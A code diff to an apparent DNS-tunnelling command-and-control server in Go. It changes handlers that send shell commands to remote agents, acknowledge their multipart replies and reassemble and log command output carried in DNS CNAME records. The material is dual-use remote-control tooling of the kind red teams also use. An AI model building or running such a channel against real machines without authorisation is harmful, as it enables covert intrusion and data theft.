@@ -76,7 +76,12 @@ func MessageHealthcheckHandler(Packet c2.MessagePacketWithSignature, q *dns.Msg)
 			TimeStamp:   uint32(time.Now().Unix()),
 			MessageType: agent.NextMessageType,
 		}
-		Answers, _, _ := c2.PreparePartitionedPayload(msg, payload, conf.GlobalServerConfig.DnsSuffix, conf.GlobalServerConfig.PrivateKey, Packet.Signature)
+		Answers, _, err := c2.PreparePartitionedPayload(msg, payload, conf.GlobalServerConfig.DnsSuffix, conf.GlobalServerConfig.PrivateKey, Packet.Signature)
+		if err != nil {
+			log.Errorf("Error preparing a response for a healthcheck message: %s", err.Error())
+			return err
+		}
+
 		for _, A := range Answers {
 			cname, err := dns.NewRR(fmt.Sprintf("%s CNAME %s", q.Question[0].Name, A)) //todo:fix the 0 index
 			if err != nil {
@@ -130,36 +135,36 @@ func HandleRunCommandResFromAgent(Packet c2.MessagePacketWithSignature, q *dns.M
 	}
 	// handle multipart incoming
 	ServerPacketBuffersWithSignature[int(Packet.Msg.ParentPartID)] = append(ServerPacketBuffersWithSignature[int(Packet.Msg.ParentPartID)], Packet)
-	if Packet.Msg.ParentPartID != 0 { // multi part
-		//fist and middle packets
-		msg := c2.MessagePacket{
-			TimeStamp:    uint32(time.Now().Unix()),
-			MessageType:  c2.MessageExecuteCommandRes,
-			ParentPartID: Packet.Msg.ParentPartID,
-			PartID:       Packet.Msg.PartID,
-		}
-		payload := []byte("Ack!")
-		if Packet.Msg.IsLastPart {
-			msg.IsLastPart = true
-			agent := ConnectedAgents[Packet.Signature.String()]
-			agent.NextMessageType = c2.MessageHealthcheck
-			ConnectedAgents[Packet.Signature.String()] = agent
-			payload = []byte("Ack! Last Part")
-		}
-		log.Infof("sending plyload %#v\n", msg)
-		// time.Sleep(2 * time.Second)
-		Answers, _, _ := c2.PreparePartitionedPayload(msg, payload, conf.GlobalServerConfig.DnsSuffix, conf.GlobalServerConfig.PrivateKey, Packet.Signature)
-		for _, A := range Answers {
-			cname, err := dns.NewRR(fmt.Sprintf("%s CNAME %s", q.Question[0].Name, A)) //todo:fix the 0 index
-			if err != nil {
-				log.Warnf("Error: %v", err) //todo:fix
-			}
-			q.Answer = append(q.Answer, cname)
-		}
-		if !Packet.Msg.IsLastPart {
-			return nil
-		}
+	// if Packet.Msg.ParentPartID != 0 { // multi part
+	//fist and middle packets
+	msg := c2.MessagePacket{
+		TimeStamp:    uint32(time.Now().Unix()),
+		MessageType:  c2.MessageExecuteCommandRes,
+		ParentPartID: Packet.Msg.ParentPartID,
+		PartID:       Packet.Msg.PartID,
 	}
+	payload := []byte("Ack!")
+	if Packet.Msg.IsLastPart || (Packet.Msg.ParentPartID == 0) {
+		msg.IsLastPart = true
+		agent := ConnectedAgents[Packet.Signature.String()]
+		agent.NextMessageType = c2.MessageHealthcheck
+		ConnectedAgents[Packet.Signature.String()] = agent
+		payload = []byte("Ack! Last Part")
+	}
+	log.Infof("sending plyload %#v\n", msg)
+	// time.Sleep(2 * time.Second)
+	Answers, _, _ := c2.PreparePartitionedPayload(msg, payload, conf.GlobalServerConfig.DnsSuffix, conf.GlobalServerConfig.PrivateKey, Packet.Signature)
+	for _, A := range Answers {
+		cname, err := dns.NewRR(fmt.Sprintf("%s CNAME %s", q.Question[0].Name, A)) //todo:fix the 0 index
+		if err != nil {
+			log.Warnf("Error: %v", err) //todo:fix
+		}
+		q.Answer = append(q.Answer, cname)
+	}
+	if !Packet.Msg.IsLastPart && !(Packet.Msg.ParentPartID == 0) {
+		return nil
+	}
+	// }
 
 	fullPayload := make([]byte, 0)
 	packets := c2.CheckMessageIntegrity(ServerPacketBuffersWithSignature[int(Packet.Msg.ParentPartID)])
@@ -170,7 +175,7 @@ func HandleRunCommandResFromAgent(Packet c2.MessagePacketWithSignature, q *dns.M
 	// todo: clean the memory for this parentpartID
 	// delete(ServerPacketBuffersWithSignature, int(packets[0].Msg.ParentPartID))
 	// todo: how do we acknowledge that we're done here and we both go back to healthcheck?
-
+	// probably should save this in a temp file rather than log. //todo
 	log.Warnf(string(bytes.Trim(fullPayload, "\x00")))
 	// remove the buffer from memory
 	delete(ServerPacketBuffersWithSignature, int(Packet.Msg.ParentPartID))
@@ -192,7 +197,10 @@ func RunCommandOnAgent(agentPublicKey *cryptography.PublicKey, command string) e
 	if targetBuffer, ok := outgoingBuffer[agentPublicKey.String()][parentPartId]; ok {
 		if parentPartId == 0 {
 			// if there was a single packet living in the cache before, delete it before proceed
-			delete(outgoingBuffer[agentPublicKey.String()], parentPartId)
+			// todo: maybe this is the place for this but I think it's better to be cleaned up elsewhere
+			// delete(outgoingBuffer[agentPublicKey.String()], parentPartId)
+			outgoingBuffer[agentPublicKey.String()] = make(map[uint16][]string)
+			outgoingBuffer[agentPublicKey.String()][parentPartId] = append(outgoingBuffer[agentPublicKey.String()][parentPartId], Answers[0])
 		}
 		log.Errorf("key and ParentPartId already exists in the buffer. Please try again")
 
@@ -208,7 +216,6 @@ func RunCommandOnAgent(agentPublicKey *cryptography.PublicKey, command string) e
 	agent := ConnectedAgents[agentPublicKey.String()]
 	agent.NextMessageType = c2.MessageExecuteCommand
 	agent.NextParentPartId = parentPartId
-	agent.HealthCheckIntervalMilliSeconds = 500
 	ConnectedAgents[agentPublicKey.String()] = agent
 	// todo: potentially a channel to notify the changes to agent's status and flick it to true when this happens?
 	// todo: set interval before returning the packet
